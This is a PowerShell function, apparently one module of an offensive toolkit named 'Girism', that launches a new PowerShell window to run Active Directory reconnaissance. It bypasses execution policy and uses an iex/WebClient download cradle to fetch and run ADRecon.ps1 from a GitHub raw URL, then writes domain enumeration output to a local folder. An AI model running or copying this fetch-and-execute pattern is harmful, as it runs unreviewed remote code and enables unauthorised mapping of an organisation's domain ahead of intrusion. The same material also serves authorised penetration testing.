function reconAD
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )

    if(!$consoleoutput) {
        # Assuming pathcheck exists; if not, handle accordingly
        try { pathcheck } catch { Write-Host -ForegroundColor Red "Error: pathcheck function not found." }
    }

    # Get the current path of the script in the parent PowerShell session
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    Write-Host -ForegroundColor Yellow 'Loading ReconAD Module:'

    # Construct the desired output directory path for ADRecon
    # This path will be relative to where the Girism script is run
    $adReconOutputDirectory = Join-Path -Path $currentPath -ChildPath "DomainRecon"

    # Launch a new PowerShell window using cmd /c start powershell
    # We use -ArgumentList to safely pass variables from the parent script to the new process.
    # The inner PowerShell script block will define a 'param' block to receive these arguments.
    cmd /c start powershell "-NoExit" -Command {
        # Define a parameter to receive the path passed from the parent script
        param($outputDirFromParent)

        # Set the window title for the new PowerShell instance
        (Get-Host).ui.RawUI.WindowTitle='ReconAD - Total Reconnaissance of Active Directory ';

        # Set execution policy for the current process to allow script execution
        Set-ExecutionPolicy Bypass -Scope Process -Force;

        # Set security protocol to allow TLS 1.2 for web downloads
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;

        # Download and execute ADRecon.ps1 from the GitHub repository
        # After execution, the ADRecon function will be available in this session.
        iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/ADRecon.ps1'));

        # Call the ADRecon function and pass the desired output directory
        # The -OutputDir parameter of ADRecon will ensure reports are saved in the specified location.
        ADRecon -OutputDir $outputDirFromParent;
    } -ArgumentList $adReconOutputDirectory # Pass the constructed output directory to the new PowerShell instance

    Write-Host -ForegroundColor Yellow 'Executing ReconAD on a new parallel window:'
}
